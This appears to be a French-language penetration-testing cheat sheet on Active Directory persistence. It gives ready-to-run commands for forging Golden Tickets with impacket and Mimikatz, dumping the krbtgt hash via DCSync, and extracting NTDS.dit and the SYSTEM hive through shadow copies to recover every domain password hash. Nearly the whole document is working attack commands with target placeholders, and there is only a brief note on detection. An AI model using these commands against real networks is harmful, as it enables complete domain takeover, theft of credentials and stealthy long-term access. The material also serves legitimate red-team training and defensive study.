# Persistence

## Golden Ticket

Forge un TGT entièrement offline en utilisant le hash NTLM du compte **krbtgt**. Permet de s'attribuer n'importe quels groupes/privilèges (Domain Admins, etc.) pour n'importe quel compte existant. Le DC accepte le ticket car il est chiffré avec la bonne clé.

> Prérequis : avoir compromis le DC ou un compte DA pour extraire le hash krbtgt.
> Durée par défaut : **10 ans** (contrairement aux TGT légitimes à 10h).
> Utiliser le **hostname** et non l'IP pour forcer Kerberos -  avec l'IP, Windows bascule sur NTLM et l'accès est refusé.

**Linux**

1. Obtenir le hash krbtgt
```bash
# Depuis Kali via DCSync
impacket-secretsdump -just-dc-user krbtgt corp.com/<DA_user>:<password>@<IP_DC>
# ou
nxc smb <IP_DC> -u <DA_user> -p <password> --ntds
# → noter le hash NTLM de krbtgt
```

2. Forger et injecter le Golden Ticket

```bash
# Obtenir le Domain SID ET le RID du compte cible en une seule commande
impacket-lookupsid corp.com/<user>:<password>@<IP_DC>
# S-1-5-21-YYY-YYY-YYY-RID
# Enlever le RID et on obtient le domain-sid

# Forger le ticket (-user-id obligatoire sur Server 2022+)
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain corp.com -user-id <RID> <username>
# → génère <username>.ccache

# Charger et utiliser
export KRB5CCNAME=<username>.ccache
impacket-psexec -k -no-pass corp.com/<username>@DC1.corp.com -dc-ip <IP_DC> -target-ip <IP_DC>
impacket-wmiexec -k -no-pass corp.com/<username>@DC1.corp.com -dc-ip <IP_DC> -target-ip <IP_DC>
```

**Windows (Mimikatz)**

```
# Purger les tickets existants
kerberos::purge

# Forger et injecter le Golden Ticket
kerberos::golden /user:<user> /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

# Ouvrir un shell et utiliser (hostname obligatoire, pas IP)
misc::cmd
```

```cmd
PsExec.exe \\DC1 cmd.exe
```

## Shadow Copies (NTDS.dit)

Deux méthodes pour extraire tous les hashes du domaine :

| Méthode | Accès fichier | Protocole | Détection |
|---|---|---|---|
| **DCSync** (défaut) | Non -  réseau uniquement | DRSUAPI (réplication AD) | Trafic de réplication depuis un non-DC suspect |
| **VSS** (`-use-vss`) | Oui -  snapshot disque | SMB + VSS | Création de shadow copy visible dans les logs |

**Pourquoi VSS :** `NTDS.dit` est verrouillé en permanence par Windows tant que le DC tourne. VSS crée un snapshot frozen du disque -  depuis ce snapshot, le fichier n'est plus verrouillé et peut être copié. `NTDS.dit` est chiffré avec une clé dans `HKLM\SYSTEM`, il faut donc exporter la ruche SYSTEM en même temps pour le déchiffrer offline.

**Kali**

```bash
# VSS method -  crée la shadow copy à distance et parse NTDS.dit
impacket-secretsdump -use-vss corp.com/<DA_user>:<password>@<IP_DC>

# ou via nxc
nxc smb <IP_DC> -u <DA_user> -p <password> --ntds vss

# Sans VSS -  DCSync direct (plus rapide, pas de shadow copy)
impacket-secretsdump corp.com/<DA_user>:<password>@<IP_DC>
nxc smb <IP_DC> -u <DA_user> -p <password> --ntds
```

**Windows**

```cmd
:: Sur le DC -  créer la shadow copy
vshadow.exe -nw -p C:
:: → noter le "Shadow copy device name" dans l'output

:: Copier NTDS.dit depuis la shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

:: Exporter la ruche SYSTEM
reg.exe save hklm\system c:\system.bak
```

Transférer les deux fichiers sur Kali puis parser :

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

